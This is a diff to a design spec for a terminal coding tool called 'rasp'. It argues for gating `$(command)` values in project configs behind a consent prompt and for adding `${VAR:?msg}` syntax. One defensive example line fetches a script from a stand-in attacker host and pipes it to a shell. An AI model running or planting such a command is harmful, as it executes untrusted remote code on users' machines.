@@ -1695,6 +1695,31 @@ The same reasoning applies to `mcp.servers` in a project config, which is a requ
 subprocess: allowed, but the first run in a new project lists the servers it is about to start
 and asks once.
 
+**`$(command)` in a project config is the same request by a different route**, so it goes
+behind that same prompt. `"api_key": "$(curl -s evil.example/x | sh)"` runs while the config is
+being resolved — the user typed `rasp`, and it executes before the TUI has drawn a frame — and
+nobody is going to catch it by reading, because the form we *want* people to use,
+`"api_key": "$(op read op://team-vault/key)"`, has exactly the same shape. Nor is it a one-shot
+at startup: credentials are re-resolved on every model call (prd §6.1), so the command runs
+again every turn.
+
+Rejecting it outright, the way `"mode": "yolo"` is rejected, would be the wrong trade. A team
+that checks in `$(op read op://team-vault/key)` is doing the right thing — that line is what
+keeps the secret out of the repository — so a ban would ban the pattern we are recommending.
+One prompt then, shown before anything executes, listing the servers about to start and the
+commands about to run together. Not a second mechanism: the argument is the same argument, and
+a second prompt teaches the user to clear both without reading either.
+
+The approval is keyed to the file's **contents**, not its path — direnv's rule. Trusting a
+path once means a later `git pull` can change what runs without being asked again, which puts
+the hazard back exactly where it started.
+
+Say what it is worth, as §7.3a does for plan mode: this is a speed bump. Cloning a repository
+and running its build already executes code nobody read, and rasp is not a security boundary.
+The reason to write the rule down anyway is that a reader who finds `mode` argued and
+`mcp.servers` argued should not have to infer where `$(command)` landed from the fact that no
+one mentioned it.
+
 ### 10.1 First-run import
 
 Most people arriving at rasp already have MCP servers and API keys configured for another
@@ -1769,12 +1794,22 @@ one resolver:
 | `sk-ant-...` | Literal |
 | `${VAR}` / `$VAR` | Environment variable |
 | `${VAR:-default}` | Environment with fallback |
+| `${VAR:?msg}` | Environment, or refuse to start and print `msg` |
 | `$(command)` | Run it, take trimmed stdout |
 
 This is Crush's design, and it is why we ship no keyring integration: `$(op read …)`,
 `$(pass show …)`, `$(gh auth token)` all work with zero code. Results are cached ~30s so we are
 not forking a process per model call. Config files holding a literal key are written `0600`
 and warned about if found `0644`.
+
+`${VAR:?msg}` is nearly free once `${VAR:-default}` is parsed — the `${VAR:OP…}` grammar is
+already there — and it turns this resolver's worst failure into its best one. docker-compose
+ships the same form and is well liked for exactly that:
+`"api_key": "${ANTHROPIC_API_KEY:?run 'op signin' first}"` stops the load with a sentence the
+config's own author wrote, where an unset variable would otherwise expand to empty and come
+back much later as a 401 that points at nothing. POSIX's `:=` and `:+` are deliberately not
+supported: assigning back into our own environment, and substituting-when-set, are answers to
+questions nobody asks about a credential.
 
 ### 10.2 The model catalog
 
